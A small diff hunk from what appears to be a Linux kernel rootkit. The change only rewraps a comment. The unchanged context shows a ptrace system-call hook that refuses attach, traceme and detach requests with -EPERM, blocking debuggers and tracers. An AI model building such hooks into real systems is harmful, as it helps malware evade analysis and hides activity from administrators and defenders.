@@ -73,8 +73,8 @@ asmlinkage long notrace chdir_hook(const struct pt_regs *regs) {
 asmlinkage void notrace ptrace_hook(struct pt_regs *regs) {
     long request = regs->di;
 
-    // Check pid for special processes ? Don't know if this function is very useful...
-    // pid_t pid = regs->si;
+    // Check pid for special processes ? Don't know if this function is very
+    // useful... pid_t pid = regs->si;
 
     if (request == PTRACE_ATTACH || request == PTRACE_TRACEME || request == PTRACE_DETACH) {
         regs->ax = -EPERM;
